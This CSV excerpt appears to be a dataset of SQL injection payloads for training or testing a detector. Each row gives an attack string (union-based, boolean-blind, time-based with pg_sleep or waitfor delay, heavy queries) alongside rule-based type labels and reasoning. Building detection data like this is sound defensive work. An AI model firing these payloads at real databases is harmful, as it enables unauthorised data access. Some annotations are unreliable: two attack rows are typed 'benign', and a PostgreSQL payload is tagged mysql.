row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2419,"1"" ) as yecj where 1194 = 1194 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
2420,"-5411%"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
2421,"1%' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2422,"1"" ) as crek where 6570 = 6570 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,6570 = 6570 and detected — boolean_blind injection (priority 8) on generic,rule-based
2423,"-6084"" ) ) union all select 7354,7354,7354,7354,7354,7354,7354,7354#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2424,"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""kojr"" = ""kojr",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
2425,-4191 ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2426,"1"" ) where 6632 = 6632 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,,boolean_blind,generic,0.95,6632 = 6632 or detected — boolean_blind injection (priority 8) on generic,rule-based
2427,"1"" ) ) waitfor delay '0:0:5' and ( ( ""witb"" = ""witb",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2428,1 ) as xylu where 3338 = 3338 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2429,-2707' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'mwdq' = 'mwdq,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
